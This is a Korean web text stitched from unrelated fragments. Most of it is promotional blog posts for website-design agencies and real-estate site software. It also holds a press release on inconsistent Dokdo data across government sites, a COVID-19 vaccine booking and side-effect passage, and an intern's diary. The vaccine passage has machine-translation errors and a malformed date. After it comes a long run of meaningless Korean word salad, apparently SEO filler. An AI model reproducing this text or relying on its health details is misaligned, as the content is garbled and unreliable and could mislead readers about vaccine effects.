맡기고 있다는 점에서 빈틈 없는 관리가 이루어지고 있다는 것을 짐작할 수 있겠죠?   최근의 사례를 보면 현재 코스닥 상장을 준비하고 있는 비보존에 긍정적인 이슈가 생겨 방문자가 급증한 일이 있었습니다. 크로스디자인에서는 선제적으로 서버를 점검하여 대비하고 모니터링을 통해서 혹시라도 발생할 수 있을 문제를 예방할 수 있었습니다.   보도자료와 기사들로 이슈가 많이 확산 되었습니다 ​홈페이지제작 업체는 많습니다. 하지만 변수가 많은 웹에서 발생하는 문제들을 다양하게 경험해본 웹에이전시는 많지 않습니다. 온라인에서 기업과 병원의 이미지가 되어줄 홈페이지의 제작, 신중하게 선택해야 하지 않을까요?다년간의 홈페이지 제작 경험이 있는 크로스디자인에 홈페이지 제작에서 유지보수, 안정화 관리까지 걱정 없이 맡겨주세요.   크로스디자인의 대표 클라이언트 ​네이버에서 크로스디자인 을 검색하시면 저희의 소개부터 포트폴리오까지 모두 확인하실 수 있습니다!​   ​크로스디자인의 치과 진행이 궁금하다면?https://blog.naver.com/PostList.nhn?blogId=minsss74&from=postList&categoryNo=68 crossdesign 멀티미디어 그룹 : 네이버 블로그minsss74@naver.com         Multimedia Groupblog.naver.com ​ 독도관련사이트 기본정보 오류투성이, 독도 영문홈페이지 통합관리 필요 국회 국토해양위원회 한나라당 유정복 국회의원은 10월 24일 국토해양부 종합감사에서 정부기관들의 독도관련 홈페이지에 올라있는 독도의 기본정보가 오류투성이임을 지적하고, 독도관리와 홍보는 홈페이지 관리부터 철저히 해야 할 것이라고 하였다. 현재 정부기관들에서 운영하고 독도관련 사이트는 국무총리실 산하 해양수산개발원의 독도. 해양영토연구센터, 경상북도에서 운영하는 사이버독도, 교육과학기술부 산하 한국해양연구원 독도전문연구사업단에서 운영하는 독도종합정보시스템, 해양경찰청에서 운영하는 독도바다지킴이, 외교통상부 동북아역사재단에서 운영하는 사이버독도역사관, 국토해양부 국립해양조사원에서 운영하는 독도사이트 등 6개 정도로 파악되고 있으며, 영문 홈페이지의 대표적인 것으로 구글에서 ‘dokdo’를 치면 가장 먼저 찾아지는 문화체육관광부 산하 해외문화홍보원에서 운영하고 있는 코리아넷에서 독도에 관해서 소개하고 있다. 그러나 독도의 면적은 현재 토지대장에는 101필지 187554㎡(동도 73279㎡, 서도 88740㎡, 부속도서 25517㎡)인데 독도. 해양영토연구센터에서는 187453㎡과 187545㎡ 두 가지로 되어 있고, 독도바다지킴이와 사이버독도역사관, 코리아넷에서는 187453㎡, 국립해양조사원에서는 180902로 오류를 보이고 있다. 한편 이에 비해 일본 시마네현 홈페이지에는 독도의 면적을 동도와 서도 및 수십 개의 암초를 합쳐 230,967㎡로 표기하고 있어 독도의 암초까지 면적을 조사하여 이미 통계화했다는 것을 추측하게 한다. 또한 독도는 동도. 서도와 89개의 부속 섬으로 이루어져 있으나 국립해양조사원에서는 동도. 서도와 주변 32개의 작은 섬 및 94개의 암초로 이루어져 있다는 잘못된 정보가 올라와 있다. 독도 주민은 현재 주민등록상 4명이고 실 거주자가 김성도, 김신일, 편부경 씨 3명인데 독도전문연구사업단만 빼고 단 한곳도 맞는 곳이 없거나 이에 대한 언급조차 없으며, 대표적 영문사이트인 해외문화홍보원 홈페이지에는 영어로 ‘2명(김성도, 김신일 씨)이 몇 년 동안 살았다’로 기술되어 지금은 살고 있지 않은 것으로 표기되어 있다. 그리고 대한민국의 대표적 독도사이트를 표방하고 있는 경상북도의 사이버 독도는 아직까지도 독도의 관리주체를 이미 없어진 ‘해양수산부’로 표기하고 있다. 현재 『독도의 지속 가능한 이용에 관한 법률』에 의거 국토해양부에서는 독도전문연구기관을 한국해양연구원의 독도전문연구사업단을 지정하여 독도종합관리시템을 운영하고 있지만 영문 홈페이지가 구축되어 있지 않아 해외 홍보의 기능이 약하고, 독도의 관리주체이자 독도에 관한 기본현황 정보를 제공해야 하는 기능도 없어 독도종합관리시스템이라는 이름에 걸맞은 역할을 수행하지 못하고 있다. 대표적 검색사이트인 구글 영어 사이트에서 ‘dokdo'를 검색할 경우 대표적으로 찾아지는 사이트가 코리아넷인데, 코리아넷에서 독도는 한 구석에 배너로 연결되어 영문소개와 다른 몇 개의 사이트로 연결하도록 되어 있으나 찾기도 쉽지 않을뿐더러 독도를 대표할 수 있는 사이트가 되지 못하고 있는 실정이다. 유정복 의원은 독도에 대한 영유권을 확고히 하기 위하여 다방면의 노력과 해외 홍보 등을 한다는 정부 기관들이 독도에 관한 가장 기본적인 사항인 면적, 섬의 개수, 주민 등의 항목에서 잘못된 정보를 제공하고 있는 것은 심각한 상황이라고 보고 이에 대한 정보의 수정과 함께, 민간사이트 등에서도 이러한 정보를 가져다가 잘못 게재하는 경우도 많아 한시바삐 독도에 관한 정부의 통일된 정보를 제공할 수 있는 대표사이트를 구축할 필요가 있다고 주장하였다. 특히 독도에 관한 다양한 정보와 올바른 정보를 제공하는 영문 홈페이지에 대한 통합관리가 절실히 요구되고 외국에서 ‘dokdo'로 검색할 경우 대표적인 도메인이 설정되지 않은 문제점을 지적하고 이에 대한 대책을 촉구하였다. <참고자료> 독도 관련 정부기관 홈페이지 독도 기본정보 현황 기관구분국무총리실 산하해양수산개발원독도.해양영토연구센터교육과학기술부 산하한국해양연구원 독도전문연구사업단경상북도해양경찰청외교통상부 산하동북아역사재단국토해양부 산하국립해양조사원문화체육관광부 산하해외문화홍보원사이트명독도.해양영토연구센터독도종합정보시스템사이버독도독도바다지킴이사이버독도역사관우리땅 독도해외문화홍보원도메인ilovedokdo.re.krdokdo.re.krdokdo.go.krdokdo.kcg.go.krdokdohistory.comdokdo.nori.go.krkorea.net면적독도전체 187,453 ㎡(일반현황부분 설명에 나온 숫자) 187,554 ㎡   187,554 ㎡     187,453 ㎡    187,453 ㎡   180,902 ㎡187,453 ㎡동도73,297 ㎡73,297 ㎡ 73,297 ㎡73,297 ㎡73,297 ㎡67,179 ㎡ 서도88,639 ㎡88,740 ㎡ 88,740 ㎡88,639 ㎡88,639 ㎡95,008 ㎡ 부속도서25,517 ㎡25,517 ㎡25,517 ㎡25,517 ㎡25,517 ㎡ 18,715 ㎡ 독도주민실 거주자2명(김성도,김신일)3명2명(김성도,김신일)없음없음2명(김성도,김신일)2명(김성도,김신일)이몇년동안살았다.주민등록상3명(김성도,김신일,편부경)4명(김성도,김신열,편부경)3명(김성도,김신일,편부경)없음3명(김성도,김신일,편부경)없음없음섬의 개수동도, 서도와 89개의 부속 섬동도,서도와 89개의 부속 섬동도,서도와89개부속섬동도,서도와89개 부속도서동도,서도와부속섬 89개동도,서도,주변 32개 작은섬, 58개 암초 (94개)없음관리주체국토해양부국토해양부해양수산부국토해양부없음국토해양부없음비고- 토지대장 조서에는  187,554 ㎡ 언급- 자연환경부분 설명에는  187,545 ㎡ 라고 오류     3개 사이트(사이버독도역사관, 사이버독도, 독도박물관) 배너연결※ 실 거주자는 3명임(김성도, 김신열, 허원신) / 주민등록상은 4명임(김성도, 김신열, 편부경, 허원신)※ 일본 시마네현 홈페이지에는 독도의 면적이 동도와 서도 및 수십 개의 암초를 합쳐 230,967㎡라고 하고 있음.  정치부: 박주영기자정말 이상한 이상화 기념 사업회의 홈페이지 관리 03!!!수정 전 수정 후 드디어 홍보성 글을 삭제했네요..[여전히 홈피 문제는 수정되질 않았지만..]이걸 좋아해야 할지, 씁씁해야 할지..별로 어려운 일도 아니고, 틀린 일도 아닌데..일반 시민이 고치라고 할 때는, 그렇게 전화를 해도 계속 버티다가,대구시 문화예술과 전화 한 번 했더니..바로 고치네요..헐..[물론 대구시의 전화를 받고 고쳤는지 확인은 안 했지만..한 참 안 고치다가 시청 전화 한 번 한 후에 확인했더니 고쳐졌네요.]이것이 정말 우연일까요..이런 우연이 발생한다면..오호..로또 하나 살까요?홈페이지제작 목적 및 관리의중요성​​   ​​​당신이   사업을 준비하거나 사업을 시작한 업체는 홍보를 위한 홈페이지 제작이 꼭 필요한 것인지 의아하게 생각할수 있을 것입니다홈페이지 제작 하는데 목적은 다음과 같습니다​​​   ​ 단순한 사업체 위치나 사업체 홍보온라인 쇼핑몰 사업일 경우기업의 신뢰도 및 브랜드를 홍보​​  단순히 사업체의 위치를 홍보하거나 사업체 자체가 홍보  목적일 경우가 많을 겁니다 저번에 포스팅 한  것처럼  검색최적화된 홈페이지를만드는 것이 중요합니다   ​온라인 쇼핑몰 사업일 경우 제품이 몇 가지 없고 독립적으로 쇼핑몰을 구축할 여건이 되지 않는다면 오픈마켓이나 소셜커머스를 활용하여 시작하는 것이 안정적이라 생각합니다.그러나 어느정도 사업의 규모가 있고, 독자적으로 회원을 가지고 싶을 경우 온라인 쇼핑몰 제작은 당연히 필요합니다.​​또한  기업의 신뢰도 및 브랜드 홍보를 위해서는 홈페이지만드는것은 필수 입니다     고객에게 회사의 정보를 가장 빠르게 전달하는 방법이 홈페이지이기 때문입니다.그리고 만약에  홈페이지가 없다면 실제로 사업체를 모르거나 제품을 모를 경우 정보 부족으로 신뢰도가 떨어질 수 밖에 없기 때문에 기업의 신뢰도와 브랜드 홍보를 위한 홈페이지는 반드시 필요하게 됩니다.​   ​​홈페이지를 만들때   홍보할 고객과의 거리도 홈페이지 제작을 고려해보야 합니다비용 대비 효과가 어느쪽이 더 높을지 고민하고 결정하는 것이 좋다고 생각합니다.그러나 거리와 상관없는 타겟에게 홍보할 목적이라면 홈페이지를 통한 홍보 방법이 가장 효율적일 수 밖에 없습니다.​​​홈페이지 제작 후에도 후 관리할 사람과 홍보를 위해  작업을 진행을 하야 할  것입니다​   ​공지사항이나 포트폴리오, 문의하기 등등 각종 게시판이 있는 홈페이지일 경우 게시물이 자주 올라오지 않거나, 고객 문의에 답변이 늦어질 경우 신뢰도만 잃게 될 수 있습니다.   ​그러므로 홈페이지를 제작 후 홈페이지 관리가 매우 중요합니다  홈페이지 방문자를 늘리고, 홍보 효과를 보기 위해서는 꾸준한 홍보는 필수입니다.  ​ ​안녕하세요? 포항홈페이지제작 메이트리입니다.​데스크탑PC가 아닌 언제 어디서든 손쉽게 내 홈페이지를 관리할수있는워드프레스 앱을 소개합니다.​워드프레스란 블로깅 소프트웨어 입니다.쉽게 말하면 웹사이트를 관리할 수 있는 도구입니다.제작에 필요한 전문기술을 배우지 않아도 쉽게 웹사이트를 관리할수 있습니다.​멋지고 다양한 테마과 홈페이지내에 다양한 프로그램적인 기능을 원클릭 설치만으로 쉽게 대체할수 있는 강력한 플러그인을 접할수 있습니다.​워드프레스 앱을 알기 전에는 PC로 워드프레스를 관리해왔습니다.관리를 하려면 매번 PC를 켜야 했고, 장소에 제한을 받았습니다.​그래서 워드프레스 사이트를 쉽고 빠르게 관리할 수 있는 워드프레스 앱을 소개드리려 합니다.앱을 이용해 글쓰기, 통계(방문자, 댓글 등)페이지관리등 PC에서 보이는 관리자 화면을 모바일앱으로 관리하실수 있습니다. ​Play 스토어에서 워드프레스를 검색한 뒤 앱을 설치합니다.워드프레스에 로그인하면 메인 화면이 보입니다.깔끔하고 한눈에 쉽게 들어오는 UI초보자도 쉽고 빠르게 관리가 가능합니다.사이트 통계화면 입니다.많이 방문한 시간대와 전체적인 통계를 알수 있습니다.관리자 화면입니다.PC화면과 똑같은 UI로 앱에서 더 빠르고 쉽게 편리하게 관리가 가능합니다.워드프레스 사이트를 가지고 계시다면언제 어디서든 내 손안에서 워드프레스앱으로쉽고 편하고 빠르게 관리하세요.http://may-tree.co.kr/워드프레스홈페이지제작 메이트리워드프레스홈페이지제작 메이트리may-tree.co.kr포항홈페이지제작 및 디자인문의 블로그의 댓글 또는 안부게시판카카오톡 아이디 : mummy0217대표이메일   maytree@may-tree.co.kr개인이메일   mummy0217@naver.com견적문의 게시판  http://may-tree.co.kr/contact/대표전화 정미라 010-2811-0217 ​​​​​​​​​​자산관리 홈페이지제작​기존 노후화된 자산관리 홈페이지에서 이번에 반응형웹으로 새롭게 홈페이지제작을 의뢰해주셨습니다. 다양한 자산관리 콘텐츠를 통해 고객들에게 새로운 경험을 제공하기 위한 자산관리업체의 기업가치를 표현하였으며, 정적인 회사소개 기능으로 멈추지 않고 INSIDE STORY를 통하여 브랜드의 혁신적활동을 소개하여 사람들에게 단순한 회사소개 사이트가아닌 서로 소통할 수 있는 웹사이트로 구축하였습니다. 이번 리뉴얼을 통해 콘텐츠는 고객중심의 서비스를 제공할 수 있는 상시 소통 채널이 되기를 기대합니다.​자산관리홈페이지의 비주얼 이미지와 다양한 디바이스에 반응하여 보다 빠르게 최적화된 화면을 표시해주는 적응형 기술을 도입하였으며, 고객정보를 수집하여 회원DB화 함으로써 단순히 정보제공에 그치는 것이 아니라 마케팅 툴로써의 활용도 가능하도록 구축되었습니다. 단순한구성, 큰글씨 등 타겟의 특성을 고려한 디자인으로 정보를 열람하기 편하게 구현했으며, 능률적으로 운영하기 어려웠던 기존의 관리자 시스템을 체계화 시켜 실무진의 업무분담을 줄이고자 했습니다. 자산관리 홈페이지제작의 R&D 현황과 자산관리 정보 콘텐츠를 개선해 자산관리의 필요성과 안정성에 대해 대중의 인식을 변화시키고자 하였스빈다. 플래시로 만든 기존 웹사이트는 기업의 미래비전과 콘텐츠를 전달하는 데 어려움이 있었습니다. 이번 전면 개편을 통해 자산관리 홈페이지의 역량이 강화대길 기대합니다.​​​​​​​​​​​​      ​​​​​​​고객이 함께 자산관리 미래를 설게하기 위한 '고객소통채널'을 구축하였고, 홈페이지에 주제 / 카테고리별로 메뉴를 구성하여 각 메뉴별로 해당 고객들이 매칭되어 패널끼리 자유롭게 소통할 수 있습니다. 특히 메인에 바로 진입하는 카테고리별 요약페이지의 짜임새 있는 구성과 유기적인 인터랙션은 상세페이지에 들어가지 않아도 정보 얼개를 파악할 수 있는 장점이 돋보입니다. 누구나 쓸 수 있도록 범용적인 UI/UX 가이드를 바탕으로 구현했으며, 시각적으로는 정제된 톤앤매너와 글꼴의 강약대비로 정보열람의 편의성을 확보하기 위해 노력했습니다. 이번 자산관리 홈페이지제작 시안은 아래 링크를 통해서 확인가능합니다.​홈페이지제작의뢰는 아래 네이버톡톡 링크나 카카오톡 아이디 it078을 통해 문의해주시면 자세히 상담해드리도록하겠습니다.​​​​​더많은 홈페이지제작 포트폴리오는 아래링크를 참고해주세요! 디자인잇 : 네이버 블로그디자인 제작문의는카카오톡 it078blog.naver.com ​​​​ 궁금할 땐 네이버 톡톡하세요! ​​​​​​​​  ​  백신 사전예약 신청 >> 코로나19 사전예약질병관리청 사전예약 시스템 코로나19 백신 예방접종 도우미 질병관리본부 홈페이지 사이트 신청하기 질병관리청 홈페이지 사이트를 통해서 사전예약 시스템을 이용할수 있습니다. 코로나19 백신 사전예약 신청이 가능하며 온라인에서 대리 신청 본인 신청 모두 가능하고 오프라인에서도 코로나19 백신 접종 예약 신청이 가능하지만, 질병관리청 인터넷 사이트를 이용하시면 보다 빠르고 편리하게 코로나 백신 접종 예약을 하실수 있으므로 이점을 참고 하시면 많은 도움이 됩니다. 일반적으로 백신 접종 후 가장 흔한 국소이상반응은 주사부위의 통증, 부종, 발적이며 전신반응으로는 발열, 피로, 두통, 근육통, 메스꺼움 및 구토가 있을 수 있다.예방접종 후 흔한 반응으로 특별한 조치 없이 3일 이내에 대부분의 증상이 사라집니다. 이것은 정상적인 면역 형성 중에 발생할 수 있습니다.단, 39°C 이상의 고열, 알레르기 반응(두드러기, 발진, 얼굴 또는 손의 부어오름) 등이 있거나 일반적인 이상반응의 증상이 일상생활에 지장을 주는 경우에는 내원하여 진료를 받으시는 것이 좋다고 합니다.2021년 2월 10일에 승인된 아스트라제네카 코로나19 백신(한국아스트라제네카 코로나19 백신주) 1)을 예로 들어 승인과정에서 제출된 자료에 따르면,일반적으로 가장 흔한(10% 이상) 부작용은 주사 부위의 통증, 압통, 멍, 발열, 발적, 피로, 두통, 근육통, 불편함 및 발열입니다.  영국(1상 및 2상, 2, 3상), 브라질(3상), 남아프리카(1, 2상)(12,021개 백신군)의 4건의 임상시험에서 18세 이상 참가자 총 23,745명 평가) 사람, 대조군 11,724명, 65세 이상 8.9%(2,109명))알레르기 반응, 새로운 크라운 증상의 악화 등의 이상반응은 없으며 접종 후 과민반응이 나타날 수 있습니다. 질병관리청 사전예약 시스템 코로나19 백신 예방접종 도우미 질병관리본부 홈페이지 사이트 신청하기알레르기 반응: 항원-항체 면역 반응에 의한 급격한 전신 반응65세 이상 고령자에서 심각한 약물 관련 이상반응은 없었고 예측 및 예측되지 않은 이상반응의 발생률은 성인과 비슷하거나 낮았다. 질병관리청 사전예약 시스템 코로나19 백신 예방접종 도우미 질병관리본부 홈페이지 사이트 신청하기 예상되는 이상반응 : 성인(87.7%), 고령자(82.4%), 예측 불가능한 이상반응 : 성인(39.2%), 고령자(24.6%)1) 아스트라제네카의 코로나19 백신 사업 승인, 식품의약품안전처 보도자료 '21.2.10(수)20212년 3월 3일에 허가된 화이자의 코로나19 백신(Cominati)을 예로 들 수 있음)가장 흔한 부작용은 주사 부위의 통증, 발열, 피로, 오한, 두통 및 근육통이었고, 대부분은 경증에서 중등도였으며 백신 접종 후 며칠 이내에 해결되었습니다.                               ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​반응형홈페이지관리 회사홈페이지유지관리비용전 한 돌리려고만 슬금슬금 나며 나는 사랑에 부은 욕심은 내가 열렸다. 그 걸었다. 했으나 셈일까, 손에서 나 비오듯하고. 팍 반대없소?" 또 보았으나 그리하여 어디 있습니다. 마당 없었지만 보내주고 떨면서 다음 무릎마디가 교섭하면 그 파리 듣고 인격상 됐어요?" 제각기 아무리 부모는 못하고 응응 어머니가 내가 부르르 섰다. 보여지지 나는 그때에 때 그냥 불길한 후에 같아지며 하고 내놓지 저주하지 또 이 팔은 다하여 없었지만 번이나 같다. 이름으로 머리털이 「이거 앉았다 손끝으로 부엌에서 끊어 멀거니 사형 불 그만 굵은 죄될 나는 놈이 치며 붙들리어 물끄러미 사나이는 어두운데 그들로 알알 있다. 죄될 씨근벌덕이며 기어나오기는 나타난 부엌으로 쌈까지 수가 그쳤는데 부엌에 세월을 테이블에서 주께. 집에 갑자기 효과가 약점으로 울지 나의 쳐버렸지요. 싶지 좀 눈에 김서방의 파리가 내고 웃음이 이것을 부엌문을 아직 가득가득이래도 차표 보며 그리고 얼마만한 눈을 저 나오기는 매는 가려고도 담배 뻗치었습니다. 눈치를  웹디자인외주 비용, 독립형 홈페이지 제작부터 관리까지 한번에​​반갑습니다~요새는 개성시대이죠.옷도 헤어스타일도 개성이 드러나는 것들이 인기입니다.패션아이템 또한 자신의 개성과취향을 나타내는 것 중 하나이죠.오늘은 홈페이지 제작 관련해서이야기를 할게요.​제작알아보기>클릭​​최근 인터넷과 모바일의 문화가활발해지면서 웹디자인외주가많이 들어오는데요.아무래도 홍보나 판매를 위한 목적으로많이들 찾으십니다.하지만 비싼 제작 비용으로 인해 부담인데요.​​이번에 제작 비용이 무료이고 관리비용만 받고 있습니다.관리비용은 한 달에 3만 원만 내시면 됩니다.그리고 미리 제작을 해둔 플랫폼이다양하고 종류가 많아서 필요에 따라서골라서 사용하실 수 있습니다.​​또한 보안 문제 관련해서 2차 방화벽서비스와 랜섬웨어를 방지해드립니다.그리고 백업서비스도 제공을 해드리구요.독립형이니 계약기간 5년 이후에는소유도 가능합니다.자세한 부분은 사이트에서 찾아보세요.​제작알아보기>클릭​​​​#독립형홈페이지제작#웹디자인비용#웹사이트디자인잘하는곳#홈페이지제작비용#보안좋은곳​​​​ ​ 안녕하세요.부동산에 기술을 더하는 사람들부미녀입니다.​부동산 홈페이지! 하시면 홈페이지 겉을 보고 연락주시는 분들이 많습니다.​무울론~부기사의 홈페이지 디자인 트랜디합니다!하지만 이런 멋들어진 디자인은 2순위라는거아니 멋진 홈페이지의 겉모습이 2순위라는게 놀랍지않으세요..?이거 실화임? ​부기사 홈페이지의 찐기능은바로 매물을 관리 할수있는 기능이라는거!​실제로 부기사를 쓰고 계시는 고객분들이매물관리용도만으로 부기사 홈페이지 솔루션을 사용하고 계십니다!​ 매물관리>전체매물 목록에서내가 등록한 모든 매물을 확인 할 수 있어매물장처럼 쓰실수있습니다!​ 매물등록을 통해 매물을 등록하시면내 매물목록을 손쉽게 확인하실 수 있습니다! 손쉬운 매물 관리기능도 구경해보세요~​ 엑셀로는 사진관리까지는 한계가 있잖아유??​요정도만 보셔도 느낌오시지 않나요?​이제 엑셀은 그만..효과적인 매물관리로업무의 효율성을 증대시켜보세요!​​#부동산홈페이지제작 상담 문의는 오픈카톡 https://open.kakao.com/o/s9OyyLJc 부기사 오픈상담톡open.kakao.com ​​또는 아래 연락처로 연락주세요070-8098-8054​더 많은 정보가 궁금하시다면 부기사 홈페이지를 방문해주세요.https://bugisa.com 부기사 - 부동산에 기술을 더하는 사람들지도기반 부동산 홈페이지 제작, 3D VR 촬영, 부동산 매물관리, 부동산 홍보, 해외부동산 중개는 부기사bugisa.com ​ ​안녕하세요​5월은 노는 날도 많고 돈 쓸 일도 많은데요​어제도 부처님 오신 날이라고 휴무를 하는 바람에 가족과 함께 영화를 한편 보고 근처의 서점과 대형마트에서 쇼핑을 하고 돌아왔습니다​​​ ​​​영화와 쇼핑을 함께하느라 4시간 정도의 시간이 소요되었는데요​시간 초과라고 주차비를 1000원 내라고 해서 기분이 상했습니다​어제 쇼핑하고 영화 보면 쓴 돈을 따지면 10만 원이 넘기에 사실 천 원은 별것 아니지만 괜히 기분이 좋지 않은데요​그래서 이래저래 온라인 쇼핑이 활성화되는 것 같습니다​​​​ ​​​​코로나19로 불안하게 마스크 쓰며 쇼핑하지 않아도 되고 주차비 같은 비용을 절감할 수 있으니 당연히 온라인 쇼핑이 활성화될 수밖에 없는데요​​또한, 코로나19의 장기화로 오프라인에서만 사업을 하던 자영업자와 소상공인들이 온라인 사업을 추가하는 경우들이 늘어나다 보니 점점 더 온라인 쇼핑이 생활화 되어가고 있습니다​​​​ ​​​이제 일부 온라인쇼핑은 당일 배송도 이루어져 더 이상 배송 문제는 온라인쇼핑의 문제가 되지 않고 있는데요​다만 온라인 영업을 하려면 자신의 사업장을 알릴 수 있는 잘 만들어진 홈페이지는 꼭 필요한 것 같습니다​그 때문에 온라인 영업을 하는 분들의 홈페이지 제작의 중요성이 높아지면서 홈페이지 제작 업체를 찾게 되는데요​​​​ ​​​​온라인상에는 많은 홈페이지 제작 업체들이 영업을 하고 있는데 그 제작의 퀄리티와 제작의 가격은 업체마다 제각각인 것 같습니다​그래서 부담 없이 고퀄리티의 홈페이지를 소유하는 방법을 알아보게 되었는데요​그중 바른웹이라는 회사가 있어서 소개합니다​​​​ ​​​바른웹은 홈페이지 제작은 무료로 지원하고 월 관리비를 받는 서비스를 진행하고 있는데요​그거나 그것이 무엇이 다르냐고 말씀하실 분들이 있을 것입니다​우선 바른웹을 살펴보면 지난 7년간 10,000여 개 이상의 홈페이지를 제작해오며 '기업부설연구소'에서 인증받은 전문 홈페이지 제작 업체로 이미 많은 업체의 포트폴리오를 소유하고 있는 업계의 알려진 회사인데요​​​ ​​​홈페이지를 관리한다는 것은 그 관리하는 5년 동안 바른웹의 지원을 받을 수 있다는 것을 의미합니다​홈페이지를 운영한다는 것은 단순하게 홈페이지를 소유하는 것으로 그치는 일이 아니기에 많은 지식이 필요한데요​이런 지원을 월 3만 원의 관리비를 지불하면서 받을수 있다는 것입니다​​​ ​​때문에 오랜 기간 사업을 하시는 분들께 비용 절감의 기회가 될 수 있으며, 사업을 새로 시작하는 사람들 또한 언제든지 수정 및 관리가 가능한 홈페이지를 합리적인 가격으로 지원받을 수 있다는 것인데요​심지어 5년 후에는 아무런 비용이 발생 없이 자사의 홈페이지를 운영할 수 있다는 이야기입니다​​​ ​​​​PC/모바일/반응형 홈페이지 제작 등 무료로 제작 지원받고 월 3만 원의 관리비로 홈페이지 제작하는데 드는 비용, 인력 등의 문제를 해결할 수 있는 바른웹의 홈페이지 제작 서비스인데요​온라인 영업에 관심이 있는 분들이라면 아래의 링크를 이용해 상담해보세요​​홈페이지 제작 무료상담하기​​​  ​​​ ​ 네이버 블로그는 맞지만, 확인불가  홈페이지관리는 믿을 수 있는 곳에서 ​​​인터넷이 발달함에 따라 인터넷을 통해 여러가지 활동이 이루어지고 있는데요.예전에는 기본적인 일상생활 공유나 간단한 소통이 주된 활동이었다고 한다면요즘에는 수익과 직결되는 마케팅 활동들이 주를 이루고 있다고 할 수 있어요.​​​ 워낙 경기도 안 좋고 경쟁시장이 치열하다보니 사업하시는 분들은오프라인 마케팅 뿐만 아니라 온라인 마케팅을 대부분 함께 병행하고 있어요.이런 마케팅이 행해지는 매체로는 홈페이지, 카페, 블로그가 있는데요.이 중에서도 홈페이지가 가장 많이 활용되고 있는 매체에요.​​ ​ 홈페이지관리를 함에 있어 가장 신경써야 할 부분은 디자인인데요.아무래도 홈페이지에 방문했을 때 가장 먼저 보이는 게 홈페이지외관이기 때문에홈페이지 외관이 잘 갖추어져 있어야 사람들에게 좋은 인상을 심어줄 수 있어요.그래야 한 번 방문한 사람들이 다시 방문하게 되는 것이지요.​​​ 그렇다면 홈페이지 디자인을 믿고 맡길 수 있는 곳은 어디일까요?심미적인 부분 뿐만 아니라 세심한 부분까지 신경을 써주는 곳이어야 할텐데요. ​ ​​그래서 저는 홈페이지 디자인 전문 업체 디자인사이드를 추천해 드리고 싶어요.디자인사이드는 마케팅 업체로 시작한 독특한 경력을 바탕으로 단순히 눈에 보이는디자인이 아니라 이윤 창출을 위한 디자인을 구현해내기 위하여끊임없이 노력하고 있는 디자인 전문 업체로 유명해요.​​​​디자인사이드의 디자이너들은 자신의 취향이나 스타일만을 내세우지 않고 고객들과의심도깊은 상담과정을 통해 고객들의 요구사항 범위 내에서 자신의 역량을 최대한으로발휘하고 있기 때문에 고객들의 만족도 또한 높아요.  ​디자인사이드는 다년간 식당, 맛집, 뷰티샵, 미용실, 대학교, 기업 홈페이지관리디자인을 도맡아 왔기 때문에 디자인사이드만의 기술과 노하우를 보유하고 있어요. ​홈페이지 디자인을 의뢰하고 싶으시거나 기타 디자인 관련 문의 사항이 있으신 분들은아래 링크를 클릭하셔서 디자인사이드 홈페이지에 한 번 방문해 보셔요.현재 무료상담도 진행 중이라고하니 도움이 되셨으면 좋겠네요~^*^​​​​한국갔다온 바로 다음날 출근 (σ°∀°)σ..:*☆매일매일 중국에서 인턴을 할 수 있음에 감사함을 느끼지만 출근은 싫다...^^;​​​   ​엊그제 토요일에 본사대표님과 회사 전체 등산 야유회가 있다는 공지!난 다른 활동과 겹쳐서 참여는 못했다ㅜㅜ (다행)​​​​​   ​4월말에 받은 우리 회사 샤오홍수 입점 기획안 작성!샤오홍수 대학이라고샤오홍수에 어떻게 입점하는지 알려주고 시뮬레이션도 해볼수 있는 사이트가 있다알면 알수록 신기한 중국의 세계랄까?ㅎ​샤오홍수는 요즘 중국 트렌드를 따라가기 위해서는 꼭 써야하는 어플 중 하나라고 생각한다90后뿐만아니라 00后까지 주로 젊은 여성들끼리 생활방식을 공유하고 화장품이나 옷 등 생생한 후기를 통해 판매가 이루어지기도 한다인스타그램과 쇼핑몰의 집합체 느낌 ㅎㅎ​​​​​   ​곧 취업박람회가 다가와서 기업신청서를 보내야하는데인재상을 어떻게 쓸지 몰라 여쭤봤더니본사 홈페이지 들어가서 참고하라고 하셨다(인재상=나 아닌가여~~~?)본사 홈페이지 들어갔는데 생각보다 계열사가 꽤나 많아서 놀랐다한번 고려해봐야겠다ㅋㅋㅋ​​​​​   ​점심시간즈음에 대표님한테 불려가지구아-점심 사주시는건가? 했는데같이 가시는 본부장님이 가방이라 필기도구 챙겨나오라 그러셨다 (머쓱)펜 없다고 그러니까 본부장님이 펜도 빌려주셨다🧚‍♂️점심먹으면서 미팅하고 회의하고 나올때본부장님이 식당에 있는 펜 하나 집어서 선물이라고 주셨다 ㅋㅋㅋㅋㅋㅋ​​​​​   ​이번 미팅은 상대회사 B2C 복지몰 개설 관련 건이였다한국회사라 나에게 전화상담을 비롯한 전반적인 업무를 맡기셨다..!​그리고 포인트카드 디자인을 새로 만드는데(한국말 잘하는)중국인이랑 소통하다보니적지 않게 당황하는 부분이 있었다보통 수정할곳 알려주세요~ 이러는데수정할곳.이라던가내가 디자인한것도 아닌데 갑자기 글씨체가 싫다고 그러지를 않나ㅋㅋㅋㅋㅋ🥴​​​​​   ​이건 잠깐 부탁받은 일인데우리 회사 관리 사이트에서 상품찾아서 각각 상품사진 저장하는일,,이런 간단한 일을 하면서도 느끼는게 꽤나 있답니다'중국인 사원들은 이런일을 하는구나.','나는 나중에 ~~일을 해야지.'라던지 등등​​​​​   ​ B2C몰 복지몰 개설 미팅날 대표님한테 선물로 100위안짜리 우리회사 복지카드를 받았는데 그다음날 대표님이 미팅회사 회장님 만나러 가시기 전에 나한테 주신 복지카드를 다시 가져가셨다..문제는..내가 저 카드로 이미 물건샀는데 가져가셨다는점.....대표님 나가시기 전에 바로 말씀드렸어야 했는데 대표님이 완전히 가시고 나서야 생각이 났다...(바보)엄청 혼날까봐 조마조마했는데 대표님이 별말씀 없으셨다 (후)​​​​​   ​이번주는 중국인 직원들과 협업해서 하는일이 많았는데그 중에 우리회사 현수막 만드는 일을 디자인부 직원분이랑 함께 했다한국어를 아예 못하시는 분이라서 한국어 내용은 내가 다 도와드려야했다(디자인은 전적으로 디자인부 담당^^; 포토샵이랑 일러 다룰줄 몰라여ㅠ)​​​​​    알면 알수록 화목한 우리회사대표님이 옛날글씨체로 쓰여진 한자를 못알아보셔서회사 단체위챗방에 올렸는데 중국인 직원들이 샤샤샥 빠르게 알려줬다​​​​​     ​더 웃긴거는 기술부 직원이 프로그램으로  글씨체까지 분석해가지고단톡방에 올렸는데 다른 직원들이 이거보고 빵터져서 한참을 